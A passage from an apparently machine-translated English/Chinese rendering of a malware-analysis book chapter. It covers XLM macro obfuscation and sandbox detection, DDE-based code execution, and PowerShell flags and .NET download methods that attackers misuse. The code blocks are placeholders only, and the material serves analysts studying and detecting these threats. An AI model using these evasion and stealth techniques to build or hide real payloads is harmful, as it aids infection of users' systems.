  zh: 但实际上，几乎所有现代恶意宏都会被混淆，并且会使用一套不同的宏来构建实际的恶意功能。我们将在这里介绍这些宏。对于`.xls`文档，在`.xlsb`和`.xlsm`基于OOXML的Excel文档之后，相应的数据通常可以在BIFF12和XML格式的`\xl\macrosheets\`目录中找到。
- en: 'Finally, the same as in VBA macros, formulas can use some particular standard
    cell names to achieve autorun capabilities. An example would be the cell starting
    with the `Auto_Open` prefix:'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，与VBA宏一样，公式可以使用一些特定的标准单元格名称来实现自动运行功能。一个例子是以`Auto_Open`前缀开头的单元格：
- en: '![Figure 10.13 – The cell with the XLM macro that will be automatically executed'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.13 – 包含将自动执行的 XLM 宏的单元格'
- en: '](img/Figure_10.13_B18500.jpg)'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.13_B18500.jpg)'
- en: Figure 10.13 – The cell with the XLM macro that will be automatically executed
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.13 – 将自动执行的 XLM 宏所在的单元格
- en: Now, let’s talk about how XLM-based payloads can be obfuscated.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们讨论基于 XLM 的有效载荷是如何被混淆的。
- en: Obfuscation
  id: totrans-223
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 混淆
- en: 'There are multiple ways attackers may attempt to complicate the work of reverse
    engineers trying to figure out malware’s purpose. Let’s explore the most common
    of them:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能尝试通过多种方式使逆向工程师在试图理解恶意软件的目的时遇到困难。让我们探讨其中最常见的几种方式：
- en: Using a white font on a white background and scattered formulas to make them
    invisible when the document is opened.
  id: totrans-225
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用白色字体和白色背景以及分散的公式，使文档打开时不可见。
- en: Using the `RUN` and `GOTO` formulas to complicate the control flow by jumping
    from one cell to another.
  id: totrans-226
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 `RUN` 和 `GOTO` 公式通过从一个单元格跳到另一个单元格来使控制流复杂化。
- en: Using the `CHAR` command to resolve string characters dynamically and `MID`
    to get substrings.
  id: totrans-227
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 `CHAR` 命令动态解析字符串字符，使用 `MID` 获取子字符串。
- en: Moving or accumulating the content around the sheet using the `FORMULA` command
    or modifying it using a combination of the `GET.CELL` and `SET.VALUE` commands.
  id: totrans-228
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 `FORMULA` 命令移动或累积工作表中的内容，或者使用 `GET.CELL` 和 `SET.VALUE` 命令的组合来修改内容。
- en: 'Storing malicious formulas in hidden sheets. There are two types, and each
    should be handled differently:'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 将恶意公式存储在隐藏的工作表中。分为两种类型，每种类型应采用不同的处理方式：
- en: '`hidden`: Right-click on any visible sheet and select **Unhide…**, then enable
    all hidden ones:'
  id: totrans-230
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`hidden`：右键点击任何可见工作表并选择 **取消隐藏…**，然后启用所有隐藏的工作表：'
- en: '![Figure 10.14 – Unhiding hidden sheets in Excel'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.14 – 在 Excel 中取消隐藏隐藏的工作表'
- en: '](img/Figure_10.14_B18500.jpg)'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.14_B18500.jpg)'
- en: Figure 10.14 – Unhiding hidden sheets in Excel
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.14 – 在 Excel 中取消隐藏隐藏的工作表
- en: '`veryhidden`: Change the `hsState` field from `2` to `0` in the corresponding
    `BoundSheet` record that’s in BIFF8 format (this requires using dedicated tools
    such as **OffVis**):'
  id: totrans-234
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`veryhidden`：将对应的 `BoundSheet` 记录中的 `hsState` 字段从 `2` 更改为 `0`，该记录是 BIFF8 格式（这需要使用专用工具，如
    **OffVis**）：'
- en: '![Figure 10.15 – Changing the hsState field associated with a veryhidden sheet'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.15 – 更改与非常隐藏工作表关联的 hsState 字段'
- en: '](img/Figure_10.15_B18500.jpg)'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.15_B18500.jpg)'
- en: Figure 10.15 – Changing the hsState field associated with a veryhidden sheet
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.15 – 更改与非常隐藏工作表关联的 hsState 字段
- en: 'Using hidden names. To reveal them, clear the `fHidden` bit in the corresponding
    `LBL` record:'
  id: totrans-238
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用隐藏的名称。要显示它们，请清除相应 `LBL` 记录中的 `fHidden` 位：
- en: '![Figure 10.16 – Changing the fHidden field to unhide the associated name'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.16 – 更改 fHidden 字段以取消隐藏关联的名称'
- en: '](img/Figure_10.16_B18500.jpg)'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.16_B18500.jpg)'
- en: Figure 10.16 – Changing the fHidden field to unhide the associated name
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.16 – 更改 fHidden 字段以取消隐藏关联的名称
- en: 'Using `GET.WORKSPACE` with different arguments to detect sandboxes, such as
    the following:'
  id: totrans-242
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 `GET.WORKSPACE` 和不同的参数来检测沙箱，例如以下内容：
- en: '`13`/`14`: Workspace width/height'
  id: totrans-243
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`13`/`14`：工作区宽度/高度'
- en: '`19`: Mouse availability'
  id: totrans-244
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`19`：鼠标可用性'
- en: '`31`: If single-step mode is currently being used'
  id: totrans-245
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`31`：如果当前正在使用单步执行模式'
- en: '`42`: Audio availability'
  id: totrans-246
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`42`：音频可用性'
- en: Executing the payload only on a particular day to tamper with behavioral analysis
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 仅在特定日期执行有效载荷以干扰行为分析
- en: Checking font size and row height or if the window has been maximized to detect
    tampering
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检查字体大小和行高，或者检查窗口是否已最大化，以检测篡改行为
- en: These are the most common obfuscation techniques. Finally, let’s see what tools
    can help us with the analysis.
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 这些是最常见的混淆技术。最后，让我们看看哪些工具能帮助我们进行分析。
- en: Static and dynamic analysis
  id: totrans-250
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 静态与动态分析
- en: 'First of all, the already mentioned **olevba** tool can be used to automatically
    extract XLM macros as well. If another tool called **XLMMacroDeobfuscator** is
    also installed on the same system, the output of olevba will also be nicely deobfuscated:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，前面提到的 **olevba** 工具也可以用来自动提取 XLM 宏。如果系统中还安装了另一个名为 **XLMMacroDeobfuscator**
    的工具，那么 olevba 的输出也会被很好地去混淆：
- en: '![Figure 10.17 – Extracted and deobfuscated chain of XLM macros'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.17 – 提取并去混淆的 XLM 宏链'
- en: '](img/Figure_10.17_B18500.jpg)'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.17_B18500.jpg)'
- en: Figure 10.17 – Extracted and deobfuscated chain of XLM macros
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.17 – 提取并去混淆的 XLM 宏链
- en: 'Apart from that, Microsoft Excel provides great embedded capabilities for debugging
    formulas. Mainly, its Name Manager and Macro Debugger parts will be particularly
    useful:'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，Microsoft Excel 提供了很好的内嵌调试公式的功能。主要是其名称管理器和宏调试器部分将特别有用：
- en: '![Figure 10.18 – Dynamic analysis of a chain of XLM macros using Excel’s debugger'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.18 – 使用 Excel 调试器动态分析 XLM 宏链'
- en: '](img/Figure_10.18_B18500.jpg)'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.18_B18500.jpg)'
- en: Figure 10.18 – Dynamic analysis of a chain of XLM macros using Excel’s debugger
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.18 – 使用 Excel 调试器动态分析 XLM 宏链
- en: Finally, the **BiffView** and **OffVis** tools can provide an intimate view
    of BIFF8 internals. OffVis can also help bypass some of the aforementioned obfuscation
    techniques that involve hiding sheets and names.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，**BiffView** 和 **OffVis** 工具可以提供 BIFF8 内部结构的详细视图。OffVis 还可以帮助绕过一些之前提到的混淆技术，这些技术涉及隐藏工作表和名称。
- en: That’s it for XLM macros. We have already learned a lot about macro-based threats,
    so now, it is time to cover other ways how malware may achieve its goals by misusing
    MS Office documents.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 关于 XLM 宏的内容到此为止。我们已经学习了很多关于基于宏的威胁，因此现在是时候讨论其他恶意软件通过滥用 MS Office 文档来实现其目标的方法了。
- en: Besides macros
  id: totrans-261
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 除了宏之外
- en: There are other methods that attackers may use to execute code once the document
    is opened. Another approach is to use the *mouse click*/*mouse over* technique,
    which involves executing a command when the user moves the mouse over a crafted
    object in PowerPoint.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能使用其他方法来在文档打开后执行代码。另一种方法是使用 *鼠标点击*/*鼠标悬停* 技术，该技术通过在用户将鼠标移到 PowerPoint 中的精心设计对象上时执行命令。
- en: 'This can be done by assigning the corresponding action to it, as follows:'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以通过将相应的操作分配给它来完成，如下所示：
- en: '![Figure 10.19 – Adding an action to an object in PowerPoint'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.19 – 在 PowerPoint 中为对象添加操作'
- en: '](img/Figure_10.19_B18500.jpg)'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.19_B18500.jpg)'
- en: Figure 10.19 – Adding an action to an object in PowerPoint
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.19 – 在 PowerPoint 中为对象添加操作
- en: The good news is that updated versions of Microsoft Office should have a protected
    view (read-only access) security feature enabled, which will warn a user about
    a potential external program’s execution if the document came from an unsafe location.
    In this case, it will be all about social engineering – whether the attacker succeeds
    in convincing the victim to ignore or disable all warnings.
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 好消息是，更新版本的 Microsoft Office 应该已经启用了受保护视图（只读访问）安全功能，如果文档来自不安全位置，它将警告用户可能的外部程序执行。在这种情况下，一切都依赖于社交工程——攻击者是否成功说服受害者忽视或禁用所有警告。
- en: Another less common way how malware may achieve execution is by using `.SettingContent-ms`
    file extension) or embedded into other documents. The `DeepLink` tag can be used
    there to specify the command to be executed. After the first few attempts to misuse
    this functionality, Microsoft promptly beefed up the security of this feature.
    Now, we don’t see malware targeting it much.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可能实现执行的另一种不太常见的方法是使用 `.SettingContent-ms` 文件扩展名，或嵌入到其他文档中。在那里可以使用 `DeepLink`
    标签指定要执行的命令。在几次尝试滥用此功能后，微软迅速增强了该功能的安全性。现在，我们很少看到恶意软件再针对它进行攻击。
- en: 'Finally, the `DDEAUTO` field with the command to execute, specified as the
    argument. Another way this functionality can be misused is by using particular
    syntax in Microsoft Excel. In this case, a malicious file will contain the command
    crafted in the following way:'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，`DDEAUTO` 字段与执行命令的参数。这种功能的另一种滥用方式是使用 Microsoft Excel 中的特定语法。在这种情况下，恶意文件将以以下方式构造命令：
- en: '[PRE4]'
  id: totrans-270
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Alternatively, the command can be passed as an argument to a built-in benign
    function such as `SUM`. Here are some example payloads that execute `calc.exe`
    after the user’s confirmation:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，可以将命令作为参数传递给内置的良性函数，如 `SUM`。以下是一些执行 `calc.exe` 的示例有效载荷，前提是用户确认：
- en: '[PRE5]'
  id: totrans-272
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Here is an example of the warning message that’s displayed by Microsoft Excel
    when this technique is used:'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 这是 Microsoft Excel 在使用此技术时显示的警告信息示例：
- en: '![Figure 10.20 – An example of a Microsoft Excel warning box related to potential
    code execution'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.20 – 与潜在代码执行相关的 Microsoft Excel 警告框示例'
- en: '](img/Figure_10.20_B18500.jpg)'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.20_B18500.jpg)'
- en: Figure 10.20 – An example of a Microsoft Excel warning box related to potential
    code execution
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.20 – 与潜在代码执行相关的 Microsoft Excel 警告框示例
- en: The **msodde** tool (part of **oletools**) may help in detecting such techniques
    in samples.
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: '**msodde** 工具（**oletools** 的一部分）可能有助于在样本中检测此类技术。'
- en: While any code execution here will require user confirmation before being enabled,
    it remains a possible attacking vector with the help of social engineering.
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然此处的任何代码执行都需要用户确认后才能启用，但借助社交工程，这依然是一个可能的攻击途径。
- en: Now that we’ve mastered macro-based threats, it is time to talk about another
    scripting language commonly misused by attackers these days – PowerShell!
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经掌握了基于宏的威胁，接下来是时候讨论攻击者如今常常滥用的另一种脚本语言——PowerShell！
- en: The power of PowerShell
  id: totrans-280
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: PowerShell 的强大功能
- en: PowerShell represents an ongoing evolution of Windows shell and scripting languages.
    Its powerful functionality, access to .NET methods, and deep integration with
    recent versions of Windows have facilitated the increase of its popularity drastically
    among common users and malicious actors. From the point of view of the attacker,
    it has many other advantages, especially in terms of obfuscation, which we are
    going to cover in great detail. Additionally, because the whole script can be
    encoded and executed as a single command, it requires no script files to hit the
    hard disk and leaves minimal traces for forensic experts.
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell代表了Windows Shell和脚本语言的持续演变。其强大的功能、对.NET方法的访问以及与最近版本Windows的深度集成，极大促进了它在普通用户和恶意攻击者中的流行。从攻击者的角度来看，它有许多其他优势，特别是在混淆方面，我们将详细讲解。此外，由于整个脚本可以被编码并作为单个命令执行，它不需要脚本文件写入硬盘，因此对法医专家留下的痕迹最少。
- en: Let’s start with the peculiarities of its syntax.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从其语法的特点开始。
- en: Basic syntax
  id: totrans-283
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 基本语法
- en: 'PowerShell command-line arguments provide unique opportunities for the attackers
    because of certain characteristics of their implementation. For example, PowerShell
    understands even truncated arguments and the associated parameters, so long as
    they are not ambiguous. Let’s go through some of the most common values that are
    used when executing the malicious code:'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell命令行参数因其实现的某些特性而为攻击者提供了独特的机会。例如，PowerShell能够理解即使是截断的参数和相关参数，只要它们不含歧义。让我们回顾一些在执行恶意代码时常用的值：
- en: '`-NoProfile` (often referred to as `-NoP`): This skips the process of loading
    the PowerShell profile; it is useful as it is not affected by local settings.'
  id: totrans-285
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-NoProfile`（通常简称为`-NoP`）：跳过加载PowerShell配置文件的过程；它很有用，因为它不受本地设置的影响。'
- en: '`-NonInteractive` (often referred to as `-NonI`): This doesn’t present an interactive
    prompt; it is useful when the purpose is to execute specified commands only.'
  id: totrans-286
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-NonInteractive`（通常简称为`-NonI`）：不会显示交互式提示；当目的是仅执行指定命令时非常有用。'
- en: '`-ExecutionPolicy` (often referred to as `-Exec` or `-EP`): This is often used
    with the `Bypass` argument to ignore settings that limit certain PowerShell functionality.
    It can also be achieved by many other approaches; for example, by modifying PowerShell’s
    execution policy registry value.'
  id: totrans-287
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-ExecutionPolicy`（通常简称为`-Exec`或`-EP`）：通常与`Bypass`参数一起使用，用于忽略限制某些PowerShell功能的设置。也可以通过其他方法实现；例如，通过修改PowerShell的执行策略注册表值。'
- en: '`-WindowStyle` (often referred to as `-Win` or `-W`): This is usually used
    by attackers with a `Hidden` (or `1`) argument to hide the corresponding window
    for stealth purposes.'
  id: totrans-288
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-WindowStyle`（通常简称为`-Win`或`-W`）：通常攻击者会使用`Hidden`（或`1`）参数来隐藏对应的窗口，以达到隐蔽目的。'
- en: '`-Command` (often referred to as `-C`): This executes a command provided in
    a command line.'
  id: totrans-289
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-Command`（通常简称为`-C`）：执行在命令行中提供的命令。'
- en: '`-EncodedCommand` (often referred to as `-Enc`, `-EC`, or `-E`): This executes
    an encoded (base64) command provided in a command line.'
  id: totrans-290
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-EncodedCommand`（通常简称为`-Enc`、`-EC`或`-E`）：用于执行在命令行中提供的编码（base64）命令。'
- en: In the preceding examples, the command-line arguments can be truncated to any
    number of letters and still be valid for PowerShell. For example, `-NoProfile`
    and `-NoProf`, or `Hidden` and `Hidde`, will be processed in the same way.
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的例子中，命令行参数可以被截断成任意数量的字母，仍然对PowerShell有效。例如，`-NoProfile`和`-NoProf`，或者`Hidden`和`Hidde`，都会被按相同方式处理。
- en: Regarding the syntax, let’s look at some commands that are often misused by
    attackers.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 关于语法，让我们看看一些攻击者常常滥用的命令。
- en: '**Native cmdlets**:'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '**本地cmdlet**：'
- en: '`Invoke-Expression` (`iex`): This executes a statement provided as an argument;
    it is very similar to the `eval` function in JavaScript.'
  id: totrans-294
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Invoke-Expression`（`iex`）：执行作为参数提供的语句；它与JavaScript中的`eval`函数非常相似。'
- en: '`Invoke-Command` (`icm`): This is often used with the `-ScriptBlock` argument
    to achieve pretty much the same functionality as `Invoke-Expression`.'
  id: totrans-295
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Invoke-Command`（`icm`）：通常与`-ScriptBlock`参数一起使用，实现与`Invoke-Expression`几乎相同的功能。'
- en: '`Invoke-WebRequest` (`iwr`): This sends a web request; for example, it could
    send a request to interact with the C&C.'
  id: totrans-296
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Invoke-WebRequest`（`iwr`）：发送一个Web请求；例如，它可以发送请求与C&C进行交互。'
- en: '`ConvertTo-SecureString`: This is commonly used for decrypting an embedded
    script.'
  id: totrans-297
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ConvertTo-SecureString`：通常用于解密嵌入的脚本。'
- en: '**NET-based methods**:'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: '**基于.NET的方法**：'
- en: 'From the `[System.Net.WebClient]` class, we have the following:'
  id: totrans-299
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 来自`[System.Net.WebClient]`类，我们有以下内容：
- en: '`DownloadString`: This downloads a string and stores it in memory, for example,
    a new command or a script to execute.'
  id: totrans-300
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`DownloadString`：下载一个字符串并将其存储在内存中，例如一个新命令或要执行的脚本。'
- en: '`DownloadData`: This is less often used by attackers; it downloads the payload
    as a byte array.'
  id: totrans-301
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`DownloadData`：攻击者较少使用此方法；它将有效负载作为字节数组下载。'
- en: '`DownloadFile`: This downloads a file to disk, for example, a new malicious
    module.'
  id: totrans-302
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`DownloadFile`：将文件下载到磁盘，例如一个新的恶意模块。'
- en: Each of these methods has an async version as well, with the corresponding name
    suffix (such as `DownloadStringAsync`).
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 这些方法每个都有一个异步版本，带有相应的名称后缀（如`DownloadStringAsync`）。
- en: 'From the `[System.Net.WebRequest]`, `[System.Net.HttpWebRequest]`, `[System.Net.FileWebRequest]`,
    and `[System.Net.FtpWebRequest]` classes, we have the following:'
  id: totrans-304
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从`[System.Net.WebRequest]`、`[System.Net.HttpWebRequest]`、`[System.Net.FileWebRequest]`和`[System.Net.FtpWebRequest]`类，我们有以下方法：
- en: '`Create` (also `CreateDefault` and `CreateHttp`): This creates a web request
    to the server.'
  id: totrans-305
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Create`（也包括`CreateDefault`和`CreateHttp`）：用于创建一个向服务器发送的网络请求。'
- en: '`GetResponse`: This sends a request and gets a response, such as with a new
    malicious module. Versions with the `Async` suffix and the `Begin` and `End` prefixes
    are also available for asynchronous operations (such as `BeginGetResponse` or
    `GetResponseAsync`), but they are rarely used by attackers.'
  id: totrans-306
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetResponse`：发送请求并获取响应，例如与一个新的恶意模块。带有`Async`后缀和`Begin`、`End`前缀的版本也可用于异步操作（如`BeginGetResponse`或`GetResponseAsync`），但攻击者很少使用这些异步版本。'
- en: '`GetRequestStream`: This returns a stream for writing data to the internet
    resource – to exfiltrate some valuable information or send infection statistics,
    for example. Versions with the `Async` suffix and the `Begin` and `End` prefixes
    are available as well.'
  id: totrans-307
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetRequestStream`：返回一个用于向互联网资源写入数据的流——例如，窃取一些有价值的信息或发送感染统计数据。带有`Async`后缀和`Begin`、`End`前缀的版本也可以使用。'
- en: 'From the `[System.Net.Http.HttpClient]` class, we have the following:'
  id: totrans-308
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从`[System.Net.Http.HttpClient]`类，我们有以下方法：
- en: '`GetAsync`, `GetStringAsync`, `GetStreamAsync`, `GetByteArrayAsync`, `PostAsync`,
    and `PutAsync`: These are multiple options for sending any type of HTTP request
    and getting a response back.'
  id: totrans-309
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`GetAsync`、`GetStringAsync`、`GetStreamAsync`、`GetByteArrayAsync`、`PostAsync`和`PutAsync`：这些是发送任何类型HTTP请求并接收响应的多种选择。'
- en: The `[System.IO.Compression.DeflateStream]` and `[System.IO.Compression.GZipStream]`
    classes are commonly employed to decompress the embedded shellcode after decoding
    it using the base64 algorithm. They are usually used with the `[System.IO.Compression.CompressionMode]::Decompress`
    parameter as an argument for an `[System.IO.StreamReader]` object (see the following
    screenshot for an example).
  id: totrans-310
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`[System.IO.Compression.DeflateStream]`和`[System.IO.Compression.GZipStream]`类通常用于解压经过Base64解码后的嵌入式Shellcode。它们通常与`[System.IO.Compression.CompressionMode]::Decompress`参数一起用作`[System.IO.StreamReader]`对象的参数（以下截图提供了示例）。'
- en: 'From the `[System.Convert]` class, we have the following:'
  id: totrans-311
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从`[System.Convert]`类，我们有以下方法：
- en: '`FromBase64String`: This decrypts base64-encoded strings, such as the next
    stage payload'
  id: totrans-312
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`FromBase64String`：用于解密Base64编码的字符串，例如下一个阶段的有效负载。'
- en: 'For .NET namespaces, the `System.` prefix can be safely omitted, as follows:'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: 对于.NET命名空间，`System.`前缀可以安全省略，如下所示：
- en: '![Figure 10.21 – An example of a Veil payload'
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.21 – 一个Veil有效负载的示例'
- en: '](img/Figure_10.21_B18500.jpg)'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.21_B18500.jpg)'
- en: Figure 10.21 – An example of a Veil payload
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.21 – 一个Veil有效负载的示例
- en: 'As we can see, using a combination of compression and base64 encoding is a
    very popular technique among attackers to store the next stage payload and, in
    this way, complicate the analysis and detection. We will talk about other obfuscation
    techniques in greater detail in the next section. Here is an example of the code
    downloading the payload and executing it:'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 如我们所见，结合压缩和Base64编码是攻击者常用的技术，用于存储下一个阶段的有效负载，从而使分析和检测更加复杂。我们将在下一节中详细讨论其他混淆技术。以下是下载并执行有效负载的代码示例：
- en: '[PRE6]'
  id: totrans-318
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: Just like command-line arguments, the method names can be truncated without
    creating ambiguity. The `Get-Command`/`gcm` command with wildcards can be used
    by the analyst to identify the full name and can also be used by attackers to
    dynamically resolve them.
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 与命令行参数一样，方法名可以被截断而不会产生歧义。分析师可以使用带有通配符的`Get-Command`/`gcm`命令来识别完整的名称，攻击者也可以使用它们来动态解析方法名。
- en: PowerShell can also be used to execute custom .NET code. In particular, the
    `Add-Type -TypeDefinition <variable_storing_source_code>` syntax can be used to
    dynamically compile .NET source code directly in the PowerShell script so that
    it can be used straight away. The `csc.exe` tool will be used behind the scenes
    for this purpose.
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 还可以用于执行自定义的 .NET 代码。特别是，`Add-Type -TypeDefinition <variable_storing_source_code>`
    语法可以用来动态编译 .NET 源代码直接在 PowerShell 脚本中，这样它就可以立即使用。为了这个目的，`csc.exe` 工具将在后台被使用。
- en: The notorious PowerShell-based Bluwimps stores information in WMI management
    classes. This makes it harder to detect using traditional antivirus solutions,
    and it can remotely execute code using the **Windows Management Instrumentation
    Command** (**WMIC**) instead of utilizing the more widely used **psexec** tool.
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 臭名昭著的基于 PowerShell 的 Bluwimps 将信息存储在 WMI 管理类中。这使得它难以通过传统的防病毒解决方案进行检测，并且可以通过
    **Windows 管理工具命令** (**WMIC**) 远程执行代码，而不是使用更广泛使用的 **psexec** 工具。
- en: Obfuscation
  id: totrans-322
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 混淆
- en: 'There are multiple open source tools available online that can generate and/or
    obfuscate PowerShell-based payloads for penetration testing. This list includes,
    but is not limited to, the following:'
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 网上有多个开源工具可以生成和/或混淆基于 PowerShell 的有效载荷用于渗透测试。此列表包括但不限于以下内容：
- en: PowerSploit
  id: totrans-324
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: PowerSploit
- en: PowerShell Empire
  id: totrans-325
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: PowerShell Empire
- en: Nishang
  id: totrans-326
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Nishang
- en: MSFvenom (part of Metasploit)
  id: totrans-327
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: MSFvenom（Metasploit 的一部分）
- en: Veil
  id: totrans-328
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Veil
- en: Invoke-Obfuscation
  id: totrans-329
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Invoke-Obfuscation
- en: 'As we know, PowerShell commands are executed through the Windows console, so
    pretty much any obfuscation technique we described previously can be applied here
    as well. In addition to this, several other simple obfuscation tricks have proved
    to be popular:'
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
